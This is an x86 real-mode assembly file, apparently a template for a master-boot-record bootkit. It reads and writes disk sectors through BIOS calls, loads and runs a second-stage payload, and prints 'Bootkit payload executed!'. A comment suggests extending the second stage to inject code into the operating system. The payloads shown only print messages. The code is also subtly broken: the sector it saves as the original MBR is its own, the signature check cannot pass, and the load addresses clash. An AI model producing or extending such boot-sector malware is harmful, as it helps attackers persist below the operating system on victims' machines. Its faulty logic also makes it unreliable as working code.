[BITS 16]                ; 16-bit mode (real mode)
[ORG 0x7C00]             ; MBR is loaded at 0x7C00 in memory

start:
    ; Disable interrupts
    cli

    ; Initialize stack
    xor ax, ax
    mov ss, ax
    mov sp, 0x7C00

    ; Save the original MBR
    mov ax, 0x0201       ; BIOS interrupt 0x13, function 0x02 (read sectors)
    mov cx, 0x0001       ; Cylinder 0, sector 1
    mov dx, 0x0080       ; Head 0, drive 80h (first hard drive)
    mov bx, 0x7E00       ; Load original MBR to 0x7E00 in memory
    int 0x13             ; Call BIOS interrupt
    jc disk_error        ; Jump if carry flag is set (error occurred)

    ; Load second-stage payload
    mov ax, 0x0202       ; Read 2 sectors (second stage)
    mov cx, 0x0002       ; Cylinder 0, sector 2
    mov dx, 0x0080       ; Head 0, drive 80h (first hard drive)
    mov bx, 0x8000       ; Load second stage to 0x8000 in memory
    int 0x13             ; Call BIOS interrupt
    jc disk_error        ; Jump if carry flag is set (error occurred)

    ; Verify second-stage payload (example: check for a signature)
    cmp word [0x8000], 0xABCD  ; Example signature
    jne payload_error

    ; Execute custom payload
    call payload

    ; Restore the original MBR
    mov ax, 0x0301       ; BIOS interrupt 0x13, function 0x03 (write sectors)
    mov cx, 0x0001       ; Cylinder 0, sector 1
    mov dx, 0x0080       ; Head 0, drive 80h (first hard drive)
    mov bx, 0x7E00       ; Write from 0x7E00 in memory
    int 0x13             ; Call BIOS interrupt
    jc disk_error        ; Jump if carry flag is set (error occurred)

    ; Jump to the original MBR
    jmp 0x0000:0x7E00    ; Far jump to the original MBR

disk_error:
    ; Display error message
    mov si, error_msg
    call print_string
    hlt                  ; Halt the system

payload_error:
    ; Display payload error message
    mov si, payload_error_msg
    call print_string
    hlt                  ; Halt the system

payload:
    ; Custom payload: Display a message
    mov si, payload_msg
    call print_string

    ; Execute second-stage payload
    call 0x8000          ; Jump to second-stage payload
    ret

print_string:
    ; Print a null-terminated string
    mov ah, 0x0E         ; BIOS teletype function
.print_char:
    lodsb                ; Load next character from SI
    cmp al, 0            ; Check for null terminator
    je .done             ; If null, done
    int 0x10             ; Print character
    jmp .print_char      ; Repeat
.done:
    ret

; Data
error_msg db "Disk error! System halted.", 0
payload_error_msg db "Payload error! System halted.", 0
payload_msg db "Bootkit payload executed!", 0

; Fill the rest of the MBR with zeros
times 510-($-$$) db 0

; Boot signature (0xAA55)
dw 0xAA55

; Second-stage payload (example)
; This payload will be loaded from sector 2
; It can be more complex, such as injecting code into the OS
second_stage:
    ; Display a message
    mov si, second_stage_msg
    call print_string
    ret

second_stage_msg db "Second-stage payload executed!", 0

; Fill the second sector with zeros
times 512 db 0
